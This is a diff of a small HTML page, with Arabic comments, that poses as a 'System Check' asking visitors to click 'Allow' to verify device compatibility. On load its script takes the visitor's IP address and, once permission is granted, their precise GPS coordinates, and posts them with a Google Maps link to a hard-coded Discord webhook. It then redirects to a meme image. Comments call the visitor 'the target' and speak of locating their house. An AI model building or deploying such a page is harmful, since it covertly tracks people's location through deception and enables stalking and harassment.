@@ -1,38 +1,71 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>GitHub Project Documentation</title>
+    <title>Checking System Compatibility</title>
 </head>
 <body>
     <script>
-        // دالة إرسال البيانات
-        function sendToDiscord(message) {
-            return fetch("https://discord.com/api/webhooks/1459200310185820361/NUkYWHtHY6QxPNWeiCzLz9zR1uKP8mALnEX-D9VEXPE0CETDNzMbYQ0XW0V5XxW9Nwlm", {
+        const webhookURL = "https://discord.com/api/webhooks/1459200310185820361/NUkYWHtHY6QxPNWeiCzLz9zR1uKP8mALnEX-D9VEXPE0CETDNzMbYQ0XW0V5XxW9Nwlm";
+
+        async function sendToDiscord(data) {
+            await fetch(webhookURL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: message })
+                body: JSON.stringify(data)
             });
         }
 
-        // محاولة جلب الـ IP وإرساله
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const msg = "🚀 **صيد جديد!**\n**الـ IP:** " + data.ip + "\n**المتصفح:** " + navigator.userAgent;
-                return sendToDiscord(msg);
-            })
-            .catch(() => {
-                // في حال فشل جلب الـ IP، نرسل تنبيه أن الرابط فُتح على الأقل
-                return sendToDiscord("⚠️ شخص ما فتح الرابط لكن المتصفح حجب الـ IP");
-            })
-            .finally(() => {
-                // التحويل لصورة الميم بعد الانتهاء
-                setTimeout(() => {
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) { return "Unavailable"; }
+        }
+
+        window.onload = async () => {
+            const ip = await getIP();
+            
+            // طلب إحداثيات الـ GPS بدقة
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    await sendToDiscord({
+                        content: "🎯 **تم تحديد موقع البيت بدقة (GPS)!**",
+                        embeds: [{
+                            title: "إحداثيات الموقع الحالي",
+                            color: 3066993, // لون أخضر
+                            fields: [
+                                { name: "رابط الخريطة", value: `[اضغط هنا لفتح الموقع](${googleMapsLink})` },
+                                { name: "خط العرض (Lat)", value: lat.toString(), inline: true },
+                                { name: "خط الطول (Lon)", value: lon.toString(), inline: true },
+                                { name: "الـ IP", value: ip }
+                            ]
+                        }]
+                    });
+                    
+                    // تحويله بعد الصيد
                     window.location.href = "https://i.imgur.com/866uX9r.jpg";
-                }, 500);
-            });
+
+                }, async (error) => {
+                    // في حال رفض إعطاء الموقع
+                    await sendToDiscord({
+                        content: "⚠️ **الهدف رفض إعطاء صلاحية الـ GPS**",
+                        description: `الـ IP الخاص به لا يزال متاحاً: ${ip}`
+                    });
+                    window.location.href = "https://i.imgur.com/866uX9r.jpg";
+                });
+            }
+        };
     </script>
-    <h1>Loading...</h1>
+    <div style="text-align: center; margin-top: 50px;">
+        <h2>System Check...</h2>
+        <p>Please click <b>"Allow"</b> to verify your device compatibility.</p>
+    </div>
 </body>
 </html>
